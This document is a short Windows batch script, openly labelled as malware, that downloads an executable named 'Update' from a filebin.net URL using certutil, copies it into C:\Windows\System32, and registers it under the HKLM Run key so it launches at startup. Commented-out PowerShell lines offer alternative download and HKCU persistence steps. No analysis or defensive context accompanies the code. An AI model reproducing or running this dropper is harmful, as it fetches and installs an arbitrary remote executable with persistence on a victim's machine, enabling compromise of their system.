@REM # echo off

@REM # Download .exe
echo "Downloading the Malware"
set "download=certutil.exe -urlcache -split -f"
%download% "https://filebin.net/ccln81grwk3s3hvz/Update" Update
@REM (New-Object Net.WebClient).DownloadFile('https://filebin.net/ccln81grwk3s3hvz/Update', 'Update')

@REM exit
@REM # Move .exe

@REM $DestinationPath = 
@REM Move-Item -Path "./Update" -Destination $DestinationPath
echo "Moving Malware to System32"
Move "./Update" "C:\Windows\System32/Update"

@REM # Add to registery
echo "Add Malware to startup"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\System32/Update"



@REM # Set variables to indicate value and key to set
@REM # $RegistryPath = 'HKCU:\Software\CommunityBlog\Scripts'
@REM $RegistryPath = 'HKCU:\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
@REM $Name         = 'Update'
@REM # Create the key if it does not exist
@REM If (-NOT (Test-Path $RegistryPath)) {
@REM   New-Item -Path $RegistryPath -Force | Out-Null
@REM }  
@REM # Now set the value
@REM New-ItemProperty -Path $RegistryPath -Name $Name -Value $DestinationPath -PropertyType REG_SZ -Force 



